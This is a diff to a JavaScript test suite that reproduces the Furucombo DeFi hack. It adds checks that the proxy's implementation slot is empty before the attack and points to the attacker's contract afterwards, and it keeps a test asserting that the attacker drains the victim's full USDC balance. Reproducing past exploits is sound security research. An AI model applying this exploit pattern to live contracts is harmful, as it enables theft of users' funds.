@@ -88,13 +88,37 @@ describe("Furucombo Hack", function () {
     const isValid = await registry.isValid(aaveV2Proxy.address);
     expect(isValid, "!isValid").to.be.true;
   });
+  it("check that furucomboProxy implementation is not set", async function () {
+    const IMPLEMENTATION_SLOT = `0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc`;
 
+    const implementationAddr = BigNumber.from(
+      await ethers.provider.getStorageAt(
+        furucomboProxy.address,
+        IMPLEMENTATION_SLOT
+      )
+    ).toHexString();
+    console.log(`furucomboProxy implementation address: ${implementationAddr}`);
+    expect(implementationAddr).to.equal(ethers.constants.Zero);
+  });
   it("performs the attack", async function () {
     tx = await attacker.setup();
     tx = await attacker.attack(usdc.address, victimAddress);
     const attackerBalance = await usdc.balanceOf(await attackerEOA.getAddress());
     expect(attackerBalance.toString(), "attacker wrong balance").to.equal(
       victimBalance.toString()
+    );
+  });
+  it("check that furucomboProxy implementation is equal to attacker's contract", async function () {
+    const IMPLEMENTATION_SLOT = `0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc`;
+    const implementationAddr = BigNumber.from(
+      await ethers.provider.getStorageAt(
+        furucomboProxy.address,
+        IMPLEMENTATION_SLOT
+      )
+    ).toHexString();
+    console.log(`furucomboProxy implementation address: ${implementationAddr}`);
+    expect(implementationAddr.toLowerCase()).to.equal(
+      attacker.address.toLowerCase()
     );
   });
 });
